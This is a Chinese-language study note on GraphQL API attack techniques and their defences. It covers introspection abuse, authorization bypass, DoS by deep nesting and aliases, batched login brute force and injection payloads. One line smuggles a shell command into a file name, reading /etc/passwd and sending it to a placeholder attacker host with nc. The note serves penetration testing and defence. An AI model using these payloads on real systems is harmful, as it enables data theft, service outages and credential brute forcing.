## 目录

- [[#一、GraphQL基础|一、GraphQL基础]]
- [[#二、内省查询利用|二、内省查询利用]]
- [[#三、字段级权限绕过|三、字段级权限绕过]]
- [[#四、深度查询DoS|四、深度查询DoS]]
- [[#五、批量查询攻击|五、批量查询攻击]]
- [[#六、GraphQL注入|六、GraphQL注入]]
- [[#七、GraphQL API安全测试|七、安全测试方法论]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、GraphQL基础

### 与传统REST的区别

| | REST | GraphQL |
|---|------|---------|
| 端点 | 多个 (`/users`, `/posts`) | 单个 (`/graphql`) |
| 数据获取 | 服务器决定返回什么 | 客户端指定需要的字段 |
| 过度获取 | 常见 | 精确控制 |
| 文档 | Swagger/OpenAPI | 内省 (Introspection) |
| 版本化 | URL版本 `/v1/` | 字段过期标记 |

### 查询基础

```graphql
# 查询：获取用户的名字和邮箱
query {
 user(id: 1) {
 name
 email
 posts {
 title
 content
 }
 }
}

# 变更：更新数据
mutation {
 updateUser(id: 1, input: { name: "New Name" }) {
 id
 name
 }
}

# 订阅：实时数据
subscription {
 userUpdated {
 id
 name
 }
}
```

## 二、内省查询利用

### 什么是内省

GraphQL的内省系统允许客户端查询API的完整模式（Schema）：

```graphql
# 查询所有类型
{
 __schema {
 types {
 name
 kind
 fields {
 name
 type { name kind }
 }
 }
 }
}

# 查询特定类型
{
 __type(name: "User") {
 name
 fields {
 name
 type { name kind }
 args { name type { name } }
 }
 }
}
```

### 利用内省发现攻击面

```graphql
# 1. 发现敏感字段
# 通过内省发现：User.passwordHash, User.resetToken, User.email

# 2. 发现隐藏的Query/Mutation
# 内省显示：adminDeleteUser, internalGetAllData

# 3. 发现所有参数
# 字段参数中包含：filter, sort, limit, offset
```

### 禁止内省？绕过方法

```graphql
# 如果 __schema 被禁用，尝试：
# 1. 用空格/注释绕过字符检查
{__schema{types{name}}}

# 2. 用别名
{ s:__schema { types { name } } }

# 3. 嵌套在合法查询中
query validQuery {
 user(id: 1) { name }
 __schema { types { name } } # 额外的内省
}
```

## 三、字段级权限绕过

### 场景

GraphQL的权限控制需要**每个字段独立检查**，但很多实现只在Query级别检查权限：

```graphql
# 假设：只有管理员能看用户邮箱
# 普通用户查询（权限不足）
query {
 user(id: 1) {
 name
 email # ← 应该被拒绝
 }
}
# 预期：{ "user": { "name": "Alice", "email": null } }
# 漏洞：{ "user": { "name": "Alice", "email": "admin@company.com" } }

# GraphQL特性：客户端控制返回字段
# 如果服务端只在Query级别检查，而非字段级别 → 权限绕过
```

### 字段建议 (Field Suggestions)

```graphql
# 输入错误的字段名，GraphQL会给出建议
query {
 user(id: 1) {
 full_name # ← 错误字段
 }
}

# 响应可能泄露正确字段名：
# "Cannot query field 'full_name' on type 'User'. 
# Did you mean 'privateEmail' or 'fullName'?"
# ↑ 泄露了隐藏字段！
```

## 四、深度查询DoS

### 循环引用攻击

```graphql
# 利用对象之间的循环引用
query DeepDoS {
 user(id: 1) {
 posts {
 author { # ← 回到User类型
 posts { # ← 又回到Post类型
 author { # ← 无限循环！
 posts {
 # ... 继续嵌套
 }
 }
 }
 }
 }
 }
}
```

### 深度+n查询

```graphql
# 每一层列出许多字段，导致指数级的嵌套
query DepthAttack {
 users { # 100条
 posts { # 每条10篇 = 1000
 comments { # 每条20评论 = 20000
 author { # 20000个作者
 posts { # 每个10篇 = 200000
 comments { # ← 爆炸！
 content
 }
 }
 }
 }
 }
 }
}
```

### 别名攻击（批量查询）

```graphql
# 用别名进行批量查询
query AliasAttack {
 q1: user(id: 1) { name email }
 q2: user(id: 2) { name email }
 q3: user(id: 3) { name email }
 # ... 重复1000次
 q1000: user(id: 1000) { name email }
}
# 一次请求 = 1000次查询 → 服务器压力巨大
```

## 五、批量查询攻击

### 数组批量查询

```graphql
# 一次查询1万个用户
query {
 users(first: 10000) {
 edges {
 node { name email phone }
 }
 }
}

# 即使后端限制了每页数量，仍可能被绕过：
# GET /graphql?query=query{users(first:10000){edges{node{email}}}}
```

### Batching攻击（批量Mutation）

```graphql
# 批量尝试登录（暴力破解）
mutation {
 a: login(username: "admin", password: "pass1") { token }
 b: login(username: "admin", password: "pass2") { token }
 c: login(username: "admin", password: "pass3") { token }
 # ... 一次请求发送100次登录尝试
 # 绕过了传统的速率限制（基于请求数/秒）
}
```

## 六、GraphQL注入

### SQL注入 via GraphQL

```graphql
# 如果参数未做安全过滤
query {
 user(id: "1 OR 1=1") {
 name
 email
 }
}

# 后端生成SQL：
# SELECT name, email FROM users WHERE id = '1 OR 1=1'
# → 返回所有用户！
```

### NoSQL注入 via GraphQL

```graphql
# MongoDB注入
query {
 users(filter: { "$where": "this.isAdmin == true" }) {
 name email
 }
}
```

### OS命令注入

```graphql
# 如果文件上传或命令参数未过滤
mutation {
 uploadFile(name: "profile; cat /etc/passwd | nc attacker 4444") {
 id
 }
}
```

## 七、安全测试方法论

### GraphQL渗透测试流程

```
Phase 1: 端点发现
 /graphql
 /gql
 /query
 /api/graphql
 /v1/graphql

Phase 2: 内省利用
 { __schema { types { name fields { name } } } }
 导出 → 生成完整API图谱

Phase 3: 权限测试
 - 未认证访问敏感Query/Mutation
 - 字段级别权限绕过
 - 跨租户数据访问 (IDOR)

Phase 4: 注入测试
 - 字符串参数 → SQL / NoSQL注入
 - 数字参数 → 类型混淆 / 溢出

Phase 5: DoS测试
 - 循环引用
 - 别名批量
 - 深度嵌套

Phase 6: 业务逻辑
 - 批量伪造
 - 竞态条件
```

### 工具

| 工具 | 用途 |
|------|------|
| **Graphw00f** | GraphQL端点指纹识别 |
| **InQL** (Burp插件) | GraphQL内省和扫描 |
| **GraphQLmap** | GraphQL攻击框架 |
| **clairvoyance** | 无法内省时的Schema推断 |
| **BatchQL** | 批量查询漏洞检测 |
| **graphql-cop** | GraphQL安全审计 |

### 常用测试命令

```bash
# 检测端点是否支持GET
curl 'https://target.com/graphql?query={__typename}'

# POST内省查询
curl -X POST https://target.com/graphql \
 -H "Content-Type: application/json" \
 -d '{"query":"{__schema{types{name}}}"}'

# 测试批量别名
curl -X POST https://target.com/graphql \
 -H "Content-Type: application/json" \
 -d '{"query":"query{a:user(id:1){name}b:user(id:2){name}}"}'
```

## 八、红队视角总结

### GraphQL攻击面速查

| 攻击 | 利用的GraphQL特性 | 危害 |
|------|-----------------|------|
| 内省泄露 | `__schema` `__type` | 完整API文档暴露 |
| 字段建议 | 错误消息 | 隐藏字段名泄露 |
| 深度嵌套 | 无深度限制 | 服务器DoS |
| 别名批量 | 别名语法 | 绕过速率限制 |
| 循环引用 | 对象关联 | CPU/内存耗尽 |
| 字段级权限 | 仅Query级检查 | 越权读取敏感数据 |
| 批量Mutation | 一次请求多操作 | 暴力破解 |

### 防御速查

```javascript
// 1. 生产环境关闭内省
const server = new ApolloServer({
 typeDefs,
 resolvers,
 introspection: false, // ← 关闭内省
 playground: false, // ← 关闭Playground
});

// 2. 查询深度限制
const depthLimit = require('graphql-depth-limit');
// 最大5层嵌套

// 3. 查询复杂度分析
const { createComplexityLimitRule } = require('graphql-validation-complexity');
// 每个查询分配成本分数

// 4. 别名数量限制
// 每个请求最多10个别名

// 5. 字段级权限
// 在Resolver中为每个字段做authZ检查
```

---
**返回** [[../前端基础总目录|前端基础总目录]]
